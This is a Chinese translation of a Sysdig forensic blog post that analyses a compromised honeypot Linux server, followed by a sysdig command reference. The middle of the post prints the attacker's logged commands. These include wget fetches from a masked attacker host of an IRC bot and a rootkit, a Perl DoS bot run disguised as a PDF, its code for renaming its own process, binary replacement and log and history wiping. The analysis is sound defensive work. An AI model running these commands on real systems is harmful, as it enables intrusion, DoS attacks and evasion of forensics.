# Fishing for Hackers: Analysis of a Linux Server Attack

From:[https://sysdig.com/blog/fishing-for-hackers/](https://sysdig.com/blog/fishing-for-hackers/)

几天前我偶然看到一篇经典的[博文](http://plusbryan.com/my-first-5-minutes-on-a-server-or-essential-security-for-linux-servers)，文章介绍了加强一个全新Linux服务安全性的常规做法，其中包括安装fail2ban，禁用SSH密码认证，随机化SSH端口，配置iptables等内容。这让我联想到，假如我与其背道而驰会发生什么？当然，最常见的结果就是使其沦陷成为一个僵尸网络的受害者，僵尸网络就是在不停地扫描大范围的公网IP地址，以期望通过暴力破解（SSH或Wordpress等）的方式找到一些配置不当的服务。但是当你成为这些简单攻击的受害者时，实际上发生了什么？攻击者又做了些什么？本篇文章就使用[sysdig](http://www.sysdig.org/)捕获分析我们服务器上实际攻击的例子，进而解答以上提出的问题。所以让我们钓起鱼儿来！

0x00 起步
=======

* * *

具体的想法就是将一组配置不当且存在漏洞的服务器暴露在互联网上，等到有人入侵后，我们再来分析一下发生了哪些有趣的事情。这就相当于：把诱饵撒到水中，等待鱼儿上钩，然后抓一个上来研究研究。首先我需要一些诱饵，意即一些配置不当的主机。现在来说这些都是so easy的事儿啦。我使用了好几种IaaS供应商（确切来说是AWS，Rackspace和Digital Ocean）的服务，配置了大约20台Ubuntu 12.04服务器——希望其中至少有一个服务器能够成为某些僵尸网络的“重点”关注对象。接下来就需要正确地记录操作系统的活动，这样我就可以确切地知道攻击者采取了哪些手段。因为我喜爱使用sysdig，所以我选择将sysdig和S3组合使用。我使用`-z`来启用sysdig的压缩功能，进而捕获每个I/O buffer中产生的大量字节数。

```
sysdig -s 4096 -z -w /mnt/sysdig/$(hostname).scap.gz

```

现在所有的实例都已配置妥当，我就简单地以"password"作为密码开启SSH root登录，以确保即使是最愚蠢的暴力破解算法也能很快地攻破系统。在这之后，我就静静地看着sysdig将结果dump到S3上。

0x01 中头彩了！
==========

* * *

第一个鱼儿来得如此之快：其中一个服务器仅在4小时后就被攻陷了！我是怎么知道的？我注意到在我的S3 bucket上，sysdig记录的文件在顷刻间往上跳了好几兆——远远超过了闲置服务器在后台运行时，应该产生大约100KB/hour的流量。所以我就将这个记录文件（大约150MB）下载到我的OSX上，探索研究一下。

0x02 探索服务器端产生的攻击
================

* * *

我以我比较喜欢的方式开始进行分析：总览一下主机上进程，网络和I/O当中发生了些什么。首先，我通过受害主机上的网络I/O流量来查看top进程：

```
$ sysdig -r trace.scap.gz -c topprocs_net
Bytes     Process
------------------------------
439.63M   /usr/sbin/httpd
422.29M   /usr/local/apac
5.27M     sshd
2.38M     wget
20.81KB   httpd
9.94KB    httpd
6.40KB    perl

```

服务器上产生了相当多的流量，但是我并没有配置任何服务！在那之后我也不记得有安装过`/usr/sbin/httpd`和`/usr/local/apac`。接下来我们再看看网络连接：

```
$ sysdig -r trace.scap.gz -c topconns
Bytes     Proto     Connection
------------------------------
439.58M   udp       170.170.35.93:50978->39.115.244.150:800
422.24M   udp       170.170.35.93:55169->39.115.244.150:800
4.91M     tcp       85.60.66.5:59893->170.170.35.93:22
46.72KB   tcp       170.170.35.93:39193->162.243.147.173:3132
43.62KB   tcp       170.170.35.93:39194->162.243.147.173:3132
20.81KB   tcp       170.170.35.93:53136->198.148.91.146:6667
1000B     udp       170.170.35.93:0->39.115.244.150:800

```

我的主机产生了800MB的UDP流量——我的天哪！这简直就是活生生的DOS攻击。我猜测攻击者安装了一些僵尸网络的客户端，来生成相应的DOS流量，所以我当机立断地把服务器关了，确保它不会对其他人造成进一步的伤害。就我目前所掌握的信息可以确定服务器已经被攻陷了，我如果使用其他的监控工具也可以得出相同的结论。然而不同的是，我的S3 bucket里存储着全部的细节，所以我就可以开始深度挖掘实际发生的情况。我先使用我最爱的chisel，`spy_users`，看看恶意用户在登录之后干了些啥：

```
$ sysdig -r trace.scap.gz -c spy_users
06:11:28 root) cd /usr/sbin
06:11:30 root) mkdir .shm
06:11:32 root) cd /usr/sbin/.shm
06:11:39 root) wget xxxxxxxxx.altervista.org/l.tgz
06:11:40 root) tar zxvf l.tgz
06:11:42 root) cd /usr/sbin/.shm/lib/.muh/src
06:11:43 root) /bin/bash ./configure --enable-local
06:11:56 root) make all

```

看到这里发生了什么吗？攻击者使用了一个“聪明”的名字`.shm`，在`/usr/sbin`目录下创建了一个隐藏文件夹，然后下载程序的源代码并开始编译。我把上面URL中的文件下载下来了，发现它是个IRC bouncer Muh。在存档文件中，我发现一些类似于攻击者非常个人化的配置文件这样有趣的事物，其中包含了各种用户名密码还有一堆用于自动加入Undernet的IRC channel。他接下来做了这些事：

```
06:13:19 root) wget http://xxxxxxxxx.altervista.org/.sloboz.pdf
06:13:20 root) perl .sloboz.pdf
06:13:20 root) rm -rf .sloboz.pdf
06:12:58 root) /sbin/iptables -I INPUT -p tcp --dport 9000 -j ACCEPT
06:12:58 root) /sbin/iptables -I OUTPUT -p tcp --dport 6667 -j ACCEPT

```

Nice！一个perl脚本文件被下载成为一个隐藏的pdf文件。我很好奇想要了解更多的东西。不幸的是，当我试图访问以上的URL时，文件已经不复存在了。好吧，还有sysdig可以帮助我，因为它记录了每一个I/O操作（正如我在命令中指定的，每个操作最多记录4096字节的数据）。我就可以看到wget往文件中写了些啥：

```
$ sysdig -r trace.scap.gz -A -c echo_fds fd.filename=.sloboz.pdf
------ Write 3.89KB to /run/shm/.sloboz.pdf
#!/usr/bin/perl
####################################################################################################################
####################################################################################################################
##  Undernet Perl IrcBot v1.02012 bY DeBiL @RST Security Team   ## [ Help ] #########################################
##      Stealth MultiFunctional IrcBot Writen in Perl          #####################################################
##        Teste on every system with PERL instlled             ##  !u @system                                     ##
##                                                             ##  !u @version                                    ##
##     This is a free program used on your own risk.           ##  !u @channel                                    ##
##        Created for educational purpose only.                ##  !u @flood                                      ##
## I'm not responsible for the illegal use of this program.    ##  !u @utils                                      ##
####################################################################################################################
## [ Channel ] #################### [ Flood ] ################################## [ Utils ] #########################
####################################################################################################################
## !u !join <#channel>          ## !u @udp1 <ip> <port> <time>              ##  !su @conback <ip> <port>          ##
## !u !part <#channel>          ## !u @udp2 <ip> <packet size> <time>       ##  !u @downlod <url+path> <file>     ##
## !u !uejoin <#channel>        ## !u @udp3 <ip> <port> <time>              ##  !u @portscan <ip>                 ##
## !u !op <channel> <nick>      ## !u @tcp <ip> <port> <packet size> <time> ##  !u @mail <subject> <sender>       ##
## !u !deop <channel> <nick>    ## !u @http <site> <time>                   ##           <recipient> <message>    ##

```

因催斯汀...这原来是一个perl DoS客户端，可以被IRC控制执行命令，所以攻击者就可以很轻松地管理这些成千上万的机器。我也是足够地幸运，因为wget在整个过程中就进行了4KB的I/O操作，所以如果我查看全部的输出，我就可以得到完整的源代码（以上的是被截断的）。通过读取其中的header我们就可以知道这个东西是怎么运作的——它应该会接收到一个“`@udp`”IRC消息然后使用网络流量冲击目标主机。让我们来看看是否有人发送了一个命令：

```
$ sysdig -r trace.scap.gz -A -c echo_fds evt.buffer contains @udp
------ Read 67B from 170.170.35.93:39194->162.243.147.173:3132
:x!~xxxxxxxxx@xxxxxxxxx.la PRIVMSG #nanana :!u @udp1 39.115.244.150 800 300

```

正如你所见，bot接收到一个（肯定来自它的owner）TCP连接，其中包含一条向39.115.244.150IP的800端口的攻击命令，这正好跟之前网络连接列表中，前两项泛洪数百兆流量的IP地址和端口号相同。这一切都很有意义！但是攻击并没有就此止步：

```
06:13:11 root) wget xxxxxxxxx.xp3.biz/other/rk.tar
06:13:12 root) tar xvf rk.tar
06:13:12 root) rm -rf rk.tar
06:13:12 root) cd /usr/sbin/rk
06:13:17 root) tar zxf mafixlibs

```

什么是mafixlibs？Google说它是一种rootkit，但是我想看看在那个tar文件里包含着什么，所以我就再次使用sysdig，查询tar写了哪些文件：

```
$ sysdig -r trace.scap.gz -c topfiles_bytes proc.name contains tar and proc.args contains mafixlibs
Bytes     Filename
------------------------------
207.76KB  /usr/sbin/rk/bin/.sh/sshd
91.29KB   /usr/sbin/rk/bin/ttymon
80.69KB   /usr/sbin/rk/bin/lsof
58.14KB   /usr/sbin/rk/bin/find
38.77KB   /usr/sbin/rk/bin/dir
38.77KB   /usr/sbin/rk/bin/ls
33.05KB   /usr/sbin/rk/bin/lib/libproc.a
30.77KB   /usr/sbin/rk/bin/ifconfig
30.71KB   /usr/sbin/rk/bin/md5sum
25.88KB   /usr/sbin/rk/bin/syslogd

```

可以很清楚地看到是一堆二进制文件。所以我猜测在我的`spy_users`输出中可以看到攻击者正在替换系统组件：

```
06:13:18 root) chattr -isa /sbin/ifconfig
06:13:18 root) cp /sbin/ifconfig /usr/lib/libsh/.backup
06:13:18 root) mv -f ifconfig /sbin/ifconfig
06:13:18 root) chattr +isa /sbin/ifconfig

```

确实，他人还挺好的给我留了一份备份文件。到目前为止我所掌握的信息有：我得到了一对IRC bots，一些入侵系统的二进制文件以及我成功解释了在开始时看到的UDP泛洪流量。但还遗留下来一个问题就是：为什么`topprocs_net`显示出所有的UDP流量都是由`/usr/sbin/httpd`和`/usr/local/apac`进程产生的，我还未在`spy_users`的输出中发现哪些安装在机器上的二进制文件呢？我猜测perl bot它自己能够发送UDP数据包，因为它是接收命令的那一方。让我们再次使用`sysdig`，并且定位到系统调用级别。我想查看所有和“`/usr/local/apac`”有关的事件：

```
$ sysdig -r trace.scap.gz -A evt.args contains /usr/local/apac
...
955716 06:13:20.225363385 0 perl (10200) < clone res=10202(perl) exe=/usr/local/apach args= tid=10200(perl) pid=10200(perl) ptid=7748(-bash) cwd=/tmp fdlimit=1024 flags=0 uid=0 gid=0 exepath=/usr/bin/perl
...

```

既然来到这儿了，我也想看看这个pid为10200的perl进程是何时启动的：

```
$ sysdig -r trace.scap.gz proc.pid = 10200
954458 06:13:20.111764417 0 perl (10200) < execve res=0 exe=perl args=.sloboz.pdf. tid=10200(perl) pid=10200(perl) ptid=7748(-bash) cwd=/run/shm fdlimit=1024 exepath=/usr/bin/perl

```

同我们之前看到的那样，perl进程只是和“`.sloboz.pdf`”相关。但是你有没有看出其中的端倪？这极有可能被鱼目混珠过去：perl进程（肯定是DoS客户端）将它自己fork了（clone event 955716），但是在这之前它把它自己的可执行文件名和参数（“exe” and “args”）从“perl .sloboz.pdf” （event 954458）改为一个随机且不可疑的“/usr/local/apach” (event 955716)。这就可以迷惑像ps，top和sysdig这样的工具。当然，在这里是并没有`/usr/local/apach`的。你可以看到在fork进程后从未执行过一个新的二进制文件，它只是改变了名字而已。通过阅读perl客户端的源码（使用`echo_fds`），我可以进一步确认这一点：

```
my @rps = ("/usr/local/apache/bin/httpd -DSSL","/usr/sbin/httpd -k start -DSSL","/usr/sbin/httpd","/usr/sbin/sshd -i","/usr/sbin/sshd","/usr/sbin/sshd -D","/sbin/syslogd","/sbin/klogd -c 1 -x -x","/usr/sbin/acpid","/usr/sbin/cron");    

my $process = $rps[rand scalar @rps];    

$0="$process".""x16;;    

my $pid=fork;

```

perl进程将其argv改为一个随机化的普通名字，然后再fork自身，很有可能是用来作为守护进程。最后，攻击者决定删除日志并用新的来替换它们：

```
06:13:30 root) rm -rf /var/log/wtmp
06:13:30 root) rm -rf /var/log/lastlog
06:13:30 root) rm -rf /var/log/secure
06:13:30 root) rm -rf /var/log/xferlog
06:13:30 root) rm -rf /var/log/messages
06:13:30 root) rm -rf /var/run/utmp
06:13:30 root) touch /var/run/utmp
06:13:30 root) touch /var/log/messages
06:13:30 root) touch /var/log/wtmp
06:13:30 root) touch /var/log/messages
06:13:30 root) touch /var/log/xferlog
06:13:30 root) touch /var/log/secure
06:13:30 root) touch /var/log/lastlog
06:13:30 root) rm -rf /var/log/maillog
06:13:30 root) touch /var/log/maillog
06:13:30 root) rm -rf /root/.bash_history
06:13:30 root) touch /root/.bash_history

```

0x04 结论
=======

* * *

哇噢。通过从高角度分析和在必要的时候深入到某个系统调用，我能够很准确地追踪到发生了什么。而这一切都是在实例完全关闭的情况下，仅仅使用[sysdig](http://www.sysdig.org/)来记录包含所有系统活动的文件！

0x05 最后说明
=========

* * *

*   本篇博文中的所有IP地址都是经过随机化处理和隐藏的，因为其中的一些被攻击的服务器很可能仍然在使用，我不想暴露他们的任何信息。
*   因为如果I/O buffer被捕获的话记录文件很容易激增，所以在高负载的生产环境中进行持续性捕获是很困难的。设置一个好的捕获过滤器（例如过滤掉主Web服务器进程的事件）可以明显地缓解这一点。

0x06 译者注
========

* * *

[安装](https://github.com/draios/sysdig/wiki/How%20to%20Install%20Sysdig%20for%20Linux)
-------------------------------------------------------------------------------------

sysdig可直接在Kali2下安装：

```
apt-get -y install sysdig

```

[快速参考指南](https://github.com/draios/sysdig/wiki/sysdig%20Quick%20Reference%20Guide#basic-command-list)
-----------------------------------------------------------------------------------------------------

### 命令格式

**sysdig**[option]... [filter]

### 命令选项

**-b, --print-base64**

以base64的形式打印出数据buffer。这对二进制数据编码非常又用，进而可以将其用于处理文本数据的媒介中（例如，终端或者json）。

**-c**_chiselname chiselargs_,**--chisel**=_chiselname chiselargs_

运行特定的chisel。如果某chisel需要传递参数，那么它们必须跟在chisel名之后。

**-cl, --list-chisels**

列出可用的chisel。其会在`.`,`./chisels`，`~/chisels`和`/usr/share/sysdig/chisels`中搜寻chisel。

**-dv, --displayflt**

为给定的过滤器设置输出。一旦设置了这个选项就会使事件在被状态系统解析后过滤。将事件在被分析前过滤是很有效的，但是可能会造成状态的丢失（例如FD名）。

**-h, --help**

打印出此帮助页面

**-j, --json**

以json的格式作为输出。数据buffer是否编码则取决于输出格式的选择。

**-l, --list**

列出可被过滤器和输出格式使用的字段。使用`-lv`将会得到每个字段的附加信息。

**-L, --list-events**

列出该设备支持的事件。

**-n**_num_,**--numevents**=_num_

在一定事件后停止捕获

**-p**_output_format_,**--print**=_output_format_

指定打印事件时使用的格式。可在examples部分获得更多相关信息。

**-q, --quiet**

不在屏幕上输出事件。这一点在dump到磁盘时非常有用。

**-r**_readfile_,**--read**=_readfile_

从文件中读取事件。

**-S, --summary**

当捕获结束时打印出事件摘要（例如top事件列表）

**-s**_len_,**--snaplen**=_len_

为每一个I/O buffer捕获的字节数。默认情况下，头80个字节会被捕获。请谨慎使用此选项，它可以产生巨大的记录文件。

**-t**_timetype_,**--timetype**=_timetype_

更改事件时间的显示方式。可接收的值有：**h**用于人类可读的字符串，**a**用于绝对时间戳，**r**用于从开始捕获起的相对时间，**d**则用于事件登入登出中的delta。

**-v, --verbose**

详细输出。

**-w**_writefile_,**--write**=_writefile_

将捕获的事件写入到_writefile_中。

### 基本命令列表

捕获当前的系统中的所有事件，并将其输出到屏幕上

> sysdig

捕获当前的系统中的所有事件，并将其存储到磁盘中

> sysdig -qw dumpfile.scap

从文件中读取事件，并将其输出到屏幕上

> sysdig -r dumpfile.scap

打印出全部由cat引发的open操作系统调用

> sysdig proc.name=cat and evt.type=open

打印出cat打开的文件名

> ./sysdig -p"%evt.arg.name" proc.name=cat and evt.type=open

列出可用的chisel

> ./sysdig -cl

为192.168.1.157IP地址运行spy_ip chisel

> sysdig –c spy_ip 192.168.1.157

### 输出格式

在默认情况下，sysdig将在一行上打印出每个捕获事件的相关信息，以如下格式呈现：

`<evt.time> <evt.cpu> <proc.name> <thread.tid> <evt.dir> <evt.type> <evt.args>`

其中：`evt.time`为时间时间戳；`evt.cpu`为事件被捕获所处的CPU number；`proc.name`为事件产生的进程名；`thread.tid`为事件产生的TID，相对于单线程进程来说就是它的PID；`evt.dir`为事件的方向，`>`为事件进入，`<`为事件退出；`evt.type`为事件的名称，例如'`open`'或者'`read`'；`evt.args`则是事件参数列表。

可利用`-p`指定输出格式，也可用使用'`sysdig -l`'列出所有的字段。

### Filtering

可在命令行的结尾设定sysdig过滤器。最简单的过滤器就是一个简单的域值检测：

> $ sysdig proc.name=cat

利用'`sysdig -l`'可得到所有可用的字段。以下对比操作符皆可用来检测相关内容：`=`，`!=`，`<`，`<=`，`>`，`>=`和`contains`。例如：

> $ sysdig fd.name contains /etc

可使用括号和布尔运算符`and`，`or`，`not`进行多重检测：

> $ sysdig "not(fd.name contains /proc or fd.name contains /dev)"

### Chisels

Sysdig中的chisels是分析sysdig事件流并执行有用的操作小脚本。如下输入可得到可用的chisel列表：

> $ sysdig –cl

对于每一个chisel，你必须键入相应的名字和其预期的参数。可使用`-c`运行一个chisel，例如：

> $ sysdig –c topfiles_bytes

如果一个chisel需要参数，可在chisel名后设定：

> $ sysdig –c spy_ip 192.168.1.157

Chiesls可与filters联合使用：

> $ sysdig -c topfiles_bytes "not fd.name contains /dev"

[使用实例](https://github.com/draios/sysdig/wiki/Sysdig%20Examples)
---------------------------------------------------------------

### Networking

*   在网络带宽使用方面查看top进程

> sysdig -c topprocs_net

*   显示与主机192.168.0.1交换的网络数据

> as binary: sysdig -s2000 -X -c echo_fds fd.cip=192.168.0.1 as ASCII: sysdig -s2000 -A -c echo_fds fd.cip=192.168.0.1

*   查看本地服务器top端口

> in terms of established connections: sysdig -c fdcount_by fd.sport "evt.type=accept" in terms of total bytes: sysdig -c fdbytes_by fd.sport

*   查看top客服端IP

> in terms of established connections sysdig -c fdcount_by fd.cip "evt.type=accept" in terms of total bytes sysdig -c fdbytes_by fd.cip

*   列出所有不是由apache服务的接入连接

> sysdig -p"%proc.name %fd.name" "evt.type=accept and proc.name!=httpd"

### Containers

*   查看运行在机器上的containers列表和他们的资源使用情况

> sudo csysdig -vcontainers

*   查看container上下文中的进程列表

> sudo csysdig -pc

*   查看wordpress1 container内运行的进程的CPU使用率

> sudo sysdig -pc -c topprocs_cpu container.name=wordpress1

*   查看wordpress1 container内运行的进程的网络带宽占用率

> sudo sysdig -pc -c topprocs_net container.name=wordpress1

*   查看wordpress1 container中使用着最大网络带宽的进程

> sudo sysdig -pc -c topprocs_net container.name=wordpress1

*   查看wordpress1 container中I/O方面的top文件

> sudo sysdig -pc -c topfiles_bytes container.name=wordpress1

*   查看wordpress1 container中的top网络连接

> sudo sysdig -pc -c topconns container.name=wordpress1

*   显示所有在wordpress1 container中执行的交互式命令

> sudo sysdig -pc -c spy_users container.name=wordpress1

### Application

*   查看设备产生的所有HTTP GET请求

> sudo sysdig -s 2000 -A -c echo_fds fd.port=80 and evt.buffer contains GET

*   查看设备产生的所有SQL select查询

> sudo sysdig -s 2000 -A -c echo_fds evt.buffer contains SELECT

*   查看通过apache传到外部MySQL服务端的实时查询

> sysdig -s 2000 -A -c echo_fds fd.sip=192.168.30.5 and proc.name=apache2 and evt.buffer contains SELECT

### Disk I/O

*   查看在磁盘带宽使用方面的top进程

> sysdig -c topprocs_file

*   列出正在使用大量文件的进程

> sysdig -c fdcount_by proc.name "fd.type=file"

*   查看在读写字节方面的top文件

> sysdig -c topfiles_bytes

*   打印出apache已经读取或者写入的top文件

> sysdig -c topfiles_bytes proc.name=httpd

*   基本的open监控，监控文件open操作

> sysdig -p "%12user.name %6proc.pid %12proc.name %3fd.num %fd.typechar %fd.name" evt.type=open

*   查看在读写磁盘活动方面的top目录

> sysdig -c fdbytes_by fd.directory "fd.type=file"

*   查看在/tmp目录下读写磁盘活动的top目录

> sysdig -c fdbytes_by fd.filename "fd.directory=/tmp/"

*   观察所有名为'passwd'文件的I/O活动

> sysdig -A -c echo_fds "fd.filename=passwd"

*   以FD type显示I/O活动

> sysdig -c fdbytes_by fd.type

### Processes and CPU usage

*   查看在CPU使用率方面的top进程

> sysdig -c topprocs_cpu

*   查看一个进程的标准输出

> sysdig -s4096 -A -c stdout proc.name=cat

### Performance and Errors

*   查看花销了大量时间的文件

> sysdig -c topfiles_time

*   查看apache花销了大量时间的文件

> sysdig -c topfiles_time proc.name=httpd

*   查看在I/O错误方面的top进程

> sysdig -c topprocs_errors

*   查看在I/O错误方面的top文件

> sysdig -c topfiles_errors

*   查看所有失败的磁盘I/O调用

> sysdig fd.type=file and evt.failed=true

*   查看httpd所有失败的文件open

> sysdig "proc.name=httpd and evt.type=open and evt.failed=true"

*   查看花销时间最长的系统调用

> See the system calls where most time has been spent

*   查看那些返回错误的系统调用

> sysdig -c topscalls "evt.failed=true"

*   监控失败的文件open操作

> sysdig -p "%12user.name %6proc.pid %12proc.name %3fd.num %fd.typechar %fd.name" evt.type=open and evt.failed=true

*   打印出延时超过1ms的文件I/O调用：

> sysdig -c fileslower 1

### Security

*   显示出"root"用户访问的目录

> sysdig -p"%evt.arg.path" "evt.type=chdir and user.name=root"

*   观察ssh活动

> sysdig -A -c echo_fds fd.name=/dev/ptmx and proc.name=sshd

*   显示出在`/etc`目录下的每一个文件open操作

> sysdig evt.type=open and fd.name contains /etc

*   显示出所有使用了"tar"命令的login shell的ID

> sysdig -r file.scap -c list_login_shells tar

*   显示出给定ID的login shell执行的所有命令

> sysdig -r trace.scap.gz -c spy_users proc.loginshellid=5459

*   使用sysdig的取证分析案例：
    
    *   [Fishing for Hackers: Analysis of a Linux Server Attack](http://draios.com/fishing-for-hackers/)
    *   [Fishing for Hackers (Part 2): Quickly Identify Suspicious Activity With Sysdig](http://draios.com/fishing-for-hackers-part-2/)